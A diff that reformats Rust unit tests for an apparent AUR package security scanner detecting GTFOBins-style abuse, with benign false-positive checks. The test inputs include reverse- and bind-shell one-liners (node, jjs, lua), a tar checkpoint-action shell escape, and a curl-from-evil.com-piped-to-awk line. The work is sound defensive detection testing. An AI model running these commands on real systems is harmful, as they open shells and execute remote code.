@@ -106,7 +106,11 @@ mod tests {
             github_not_found: false,
             aur_comments: vec![],
         };
-        GtfobinsAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect()
+        GtfobinsAnalysis
+            .analyze(&ctx)
+            .iter()
+            .map(|s| s.id.clone())
+            .collect()
     }
 
     fn has(ids: &[String], id: &str) -> bool {
@@ -117,7 +121,9 @@ mod tests {
 
     #[test]
     fn revshell_node() {
-        let ids = analyze("node -e 'var net = require(\"net\"); var c = new net.Socket(); c.connect(4444, \"10.0.0.1\")'");
+        let ids = analyze(
+            "node -e 'var net = require(\"net\"); var c = new net.Socket(); c.connect(4444, \"10.0.0.1\")'",
+        );
         assert!(has(&ids, "G-REVSHELL-NODE"), "got: {ids:?}");
     }
 
@@ -135,7 +141,9 @@ mod tests {
 
     #[test]
     fn revshell_jjs() {
-        let ids = analyze("jjs -e 'var p=new java.lang.ProcessBuilder; Runtime.getRuntime().exec(\"/bin/sh\")'");
+        let ids = analyze(
+            "jjs -e 'var p=new java.lang.ProcessBuilder; Runtime.getRuntime().exec(\"/bin/sh\")'",
+        );
         assert!(has(&ids, "G-REVSHELL-JJS"), "got: {ids:?}");
     }
 
@@ -174,7 +182,10 @@ mod tests {
     #[test]
     fn bindshell_nc_megasync_no_signal() {
         let ids = analyze("git -C MEGAsync -c protocol.file.allow='always' submodule update");
-        assert!(!has(&ids, "G-BINDSHELL-NC"), "MEGAsync should not trigger G-BINDSHELL-NC, got: {ids:?}");
+        assert!(
+            !has(&ids, "G-BINDSHELL-NC"),
+            "MEGAsync should not trigger G-BINDSHELL-NC, got: {ids:?}"
+        );
     }
 
     // === Pipe-to-Interpreter ===
@@ -285,7 +296,8 @@ mod tests {
 
     #[test]
     fn tar_checkpoint() {
-        let ids = analyze("tar czf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh");
+        let ids =
+            analyze("tar czf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh");
         assert!(has(&ids, "G-TAR-CHECKPOINT"), "got: {ids:?}");
     }
 
@@ -615,7 +627,8 @@ mod tests {
 
     #[test]
     fn benign_pkgbuild_no_signals() {
-        let ids = analyze(r#"
+        let ids = analyze(
+            r#"
 pkgname=yay
 pkgver=12.4.2
 pkgrel=1
@@ -635,36 +648,51 @@ build() {
 package() {
     install -Dm755 yay "${pkgdir}/usr/bin/yay"
 }
-"#);
-        assert!(ids.is_empty(), "Benign PKGBUILD should trigger no signals, got: {ids:?}");
+"#,
+        );
+        assert!(
+            ids.is_empty(),
+            "Benign PKGBUILD should trigger no signals, got: {ids:?}"
+        );
     }
 
     #[test]
     fn benign_node_build_no_pipe() {
         // node is used in build process but not piped from download
-        let ids = analyze(r#"
+        let ids = analyze(
+            r#"
 build() {
     cd "$pkgname-$pkgver"
     npm install
     npm run build
 }
-"#);
+"#,
+        );
         // Should not trigger G-PIPE-NODE
-        assert!(!has(&ids, "G-PIPE-NODE"), "npm install should not trigger pipe-to-node");
+        assert!(
+            !has(&ids, "G-PIPE-NODE"),
+            "npm install should not trigger pipe-to-node"
+        );
     }
 
     #[test]
     fn benign_tar_extract() {
         // Normal tar extract without checkpoint-action
         let ids = analyze("tar xf source.tar.gz");
-        assert!(!has(&ids, "G-TAR-CHECKPOINT"), "Normal tar extract should not trigger");
+        assert!(
+            !has(&ids, "G-TAR-CHECKPOINT"),
+            "Normal tar extract should not trigger"
+        );
     }
 
     #[test]
     fn benign_rsync_local() {
         // Local rsync without remote
         let ids = analyze("rsync -a src/ dest/");
-        assert!(!has(&ids, "G-DOWNLOAD-RSYNC"), "Local rsync should not trigger");
+        assert!(
+            !has(&ids, "G-DOWNLOAD-RSYNC"),
+            "Local rsync should not trigger"
+        );
     }
 
     // === Reverse/Bind Shell Gaps ===
@@ -715,7 +743,8 @@ build() {
 
     #[test]
     fn bindshell_lua_bind() {
-        let ids = analyze("lua -e 'local s=require(\"socket\"); local srv=socket.bind(\"*\",4444)'");
+        let ids =
+            analyze("lua -e 'local s=require(\"socket\"); local srv=socket.bind(\"*\",4444)'");
         assert!(has(&ids, "G-BINDSHELL-LUA"), "got: {ids:?}");
     }
 
@@ -942,22 +971,34 @@ build() {
     fn benign_cmake_build() {
         // Normal cmake usage
         let ids = analyze("cmake -B build -DCMAKE_BUILD_TYPE=Release");
-        assert!(!has(&ids, "G-CMAKE-EXEC"), "Normal cmake should not trigger");
+        assert!(
+            !has(&ids, "G-CMAKE-EXEC"),
+            "Normal cmake should not trigger"
+        );
     }
 
     #[test]
     fn benign_docker_build() {
         // Docker build without volume mount
         let ids = analyze("docker build -t myimage .");
-        assert!(!has(&ids, "G-DOCKER-RUN"), "Docker build should not trigger run pattern");
-        assert!(!has(&ids, "G-DOCKER-EXEC"), "Docker build should not trigger exec pattern");
+        assert!(
+            !has(&ids, "G-DOCKER-RUN"),
+            "Docker build should not trigger run pattern"
+        );
+        assert!(
+            !has(&ids, "G-DOCKER-EXEC"),
+            "Docker build should not trigger exec pattern"
+        );
     }
 
     #[test]
     fn benign_install_normal_mode() {
         // Normal install without SUID bits
         let ids = analyze("install -Dm755 binary /usr/bin/binary");
-        assert!(!has(&ids, "G-INSTALL-SUID"), "Normal install should not trigger SUID pattern");
+        assert!(
+            !has(&ids, "G-INSTALL-SUID"),
+            "Normal install should not trigger SUID pattern"
+        );
     }
 
     // --- cross-line false positive regression ---
@@ -965,14 +1006,22 @@ build() {
     #[test]
     fn curl_on_different_line_than_awk_no_signal() {
         // curl on one line, awk on a later line — should NOT match across lines
-        let ids = analyze("curl -JLO \"$_iso\"\necho \"extracting\"\n7z x $(echo \"$_iso\" | awk -F \"/\" '{print $NF}') sources/install.wim");
-        assert!(!has(&ids, "G-PIPE-AWK"), "cross-line curl...awk should not trigger, got: {ids:?}");
+        let ids = analyze(
+            "curl -JLO \"$_iso\"\necho \"extracting\"\n7z x $(echo \"$_iso\" | awk -F \"/\" '{print $NF}') sources/install.wim",
+        );
+        assert!(
+            !has(&ids, "G-PIPE-AWK"),
+            "cross-line curl...awk should not trigger, got: {ids:?}"
+        );
     }
 
     #[test]
     fn curl_pipe_awk_same_line_still_detected() {
         let ids = analyze("curl http://evil.com/exploit.awk | awk -f -");
-        assert!(has(&ids, "G-PIPE-AWK"), "same-line curl|awk should still trigger, got: {ids:?}");
+        assert!(
+            has(&ids, "G-PIPE-AWK"),
+            "same-line curl|awk should still trigger, got: {ids:?}"
+        );
     }
 
     // --- sed -e flag false positive regression ---
@@ -980,13 +1029,19 @@ build() {
     #[test]
     fn sed_dash_e_flag_no_signal() {
         let ids = analyze("sed -e 's/foo/bar/' file");
-        assert!(!has(&ids, "G-SED-EXEC"), "sed -e flag should not trigger, got: {ids:?}");
+        assert!(
+            !has(&ids, "G-SED-EXEC"),
+            "sed -e flag should not trigger, got: {ids:?}"
+        );
     }
 
     #[test]
     fn sed_combined_flags_no_signal() {
         let ids = analyze("sed -i -e 's/old/new/g' file.txt");
-        assert!(!has(&ids, "G-SED-EXEC"), "sed -i -e should not trigger, got: {ids:?}");
+        assert!(
+            !has(&ids, "G-SED-EXEC"),
+            "sed -i -e should not trigger, got: {ids:?}"
+        );
     }
 
     // --- install -m755 false positive regression ---
@@ -994,13 +1049,19 @@ build() {
     #[test]
     fn install_m755_no_suid() {
         let ids = analyze("install -m755 binary /usr/bin/binary");
-        assert!(!has(&ids, "G-INSTALL-SUID"), "install -m755 should not trigger SUID, got: {ids:?}");
+        assert!(
+            !has(&ids, "G-INSTALL-SUID"),
+            "install -m755 should not trigger SUID, got: {ids:?}"
+        );
     }
 
     #[test]
     fn install_m644_no_suid() {
         let ids = analyze("install -m644 license /usr/share/licenses/pkg/LICENSE");
-        assert!(!has(&ids, "G-INSTALL-SUID"), "install -m644 should not trigger SUID, got: {ids:?}");
+        assert!(
+            !has(&ids, "G-INSTALL-SUID"),
+            "install -m644 should not trigger SUID, got: {ids:?}"
+        );
     }
 
     #[test]
@@ -1030,12 +1091,18 @@ build() {
             github_not_found: false,
             aur_comments: vec![],
         };
-        GtfobinsAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect()
+        GtfobinsAnalysis
+            .analyze(&ctx)
+            .iter()
+            .map(|s| s.id.clone())
+            .collect()
     }
 
     #[test]
     fn install_script_revshell_node() {
-        let ids = analyze_install("node -e 'var net = require(\"net\"); var c = new net.Socket(); c.connect(4444, \"10.0.0.1\")'");
+        let ids = analyze_install(
+            "node -e 'var net = require(\"net\"); var c = new net.Socket(); c.connect(4444, \"10.0.0.1\")'",
+        );
         assert!(has(&ids, "IS-G-REVSHELL-NODE"), "got: {ids:?}");
     }
 
@@ -1047,13 +1114,18 @@ build() {
 
     #[test]
     fn install_script_tar_checkpoint() {
-        let ids = analyze_install("tar czf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh");
+        let ids = analyze_install(
+            "tar czf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
+        );
         assert!(has(&ids, "IS-G-TAR-CHECKPOINT"), "got: {ids:?}");
     }
 
     #[test]
     fn install_script_benign_no_signals() {
         let ids = analyze_install("post_install() {\n    echo 'Done'\n}");
-        assert!(ids.is_empty(), "benign install script should trigger no signals, got: {ids:?}");
+        assert!(
+            ids.is_empty(),
+            "benign install script should trigger no signals, got: {ids:?}"
+        );
     }
 }
